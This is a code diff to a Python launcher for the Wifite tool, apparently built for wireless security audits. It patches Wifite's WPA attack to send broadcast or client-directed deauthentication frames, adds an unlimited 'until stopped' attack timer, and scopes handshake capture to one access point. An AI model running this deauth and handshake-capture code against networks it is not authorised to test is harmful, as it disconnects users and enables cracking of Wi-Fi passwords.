@@ -135,39 +135,49 @@ def select_handshake(capfile, bssid, client):
         scoped.unlink(missing_ok=True)
 
 
-def active_wifite(scope, args):
-    # Wifite normally sends a broadcast burst as well as client-specific
-    # bursts. Override only the WPA deauth step in this process.
+def active_wifite(scope, duration, args):
+    # Retain Wifite's deauth timer. Restrict the target, and suppress its
+    # default broadcast and other-client bursts for a directed audit.
     from wifite import wifite
     from wifite.config import Configuration
 
     sys.argv = ["wifite", *args]
     Configuration.initialize(load_interface=False)
-    from wifite.attack.wpa import AttackWPA, Handshake
+    from wifite.attack import wpa
     from wifite.tools.aireplay import Aireplay
+
+    if duration == "until-stopped":
+        class AuditTimer(wpa.Timer):
+            def __str__(self):
+                if self.end_time == float("inf"):
+                    return "until stopped"
+                return super().__str__()
+
+        wpa.Timer = AuditTimer
+        Configuration.wpa_attack_timeout = float("inf")
+    else:
+        Configuration.wpa_attack_timeout = int(duration)
 
     bssid = args[args.index("--bssid") + 1].lower()
     client = None if scope == "whole-ap" else scope
     if not shutil.which("tshark"):
         raise RuntimeError("Install tshark before running the ALFA Active audit")
-    sent = False
+    native_deauth = wpa.AttackWPA.deauth
 
-    def deauth(_attack, target):
-        nonlocal sent
-        if sent or target.bssid.lower() != bssid:
+    def deauth(attack, target):
+        if Configuration.no_deauth or target.bssid.lower() != bssid:
             return
-        if client is not None and all(station.station.lower() != client for station in target.clients):
-            return
-        sent = True
-        scope_label = f"directed deauth burst to {client}" if client else f"broadcast deauth burst for {bssid}"
-        print(f"\nWifite: sending one {scope_label}", flush=True)
-        Aireplay.deauth(bssid, client_mac=client, num_deauths=1, timeout=5)
+        if client is None:
+            native_deauth(attack, target)
+        elif any(station.station.lower() == client for station in target.clients):
+            print(f"\nWifite: sending directed deauth to {client}", flush=True)
+            Aireplay.deauth(bssid, client_mac=client, timeout=2)
 
     def has_handshake(handshake):
         return select_handshake(handshake.capfile, bssid, client)
 
-    AttackWPA.deauth = deauth
-    Handshake.has_handshake = has_handshake
+    wpa.AttackWPA.deauth = deauth
+    wpa.Handshake.has_handshake = has_handshake
     return wifite.main()
 
 
@@ -227,7 +237,7 @@ def main():
         tool_index = 1 if discovery else 2
         if command[tool_index] != "wifite":
             raise ValueError("This launcher mode requires Wifite")
-        worker = ["--discovery-worker"] if discovery else ["--active-worker", command[1]]
+        worker = ["--discovery-worker"] if discovery else ["--active-worker", command[1], duration]
         command = [sys.executable, "-c", source, *worker, *command[tool_index + 1:]]
     process = subprocess.Popen(command)
     try:
@@ -245,7 +255,7 @@ def main():
 
 if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] == "--active-worker":
-        sys.exit(active_wifite(sys.argv[2], sys.argv[3:]))
+        sys.exit(active_wifite(sys.argv[2], sys.argv[3], sys.argv[4:]))
     if len(sys.argv) > 1 and sys.argv[1] == "--discovery-worker":
         sys.exit(discovery_wifite(sys.argv[2:]))
     sys.exit(main())
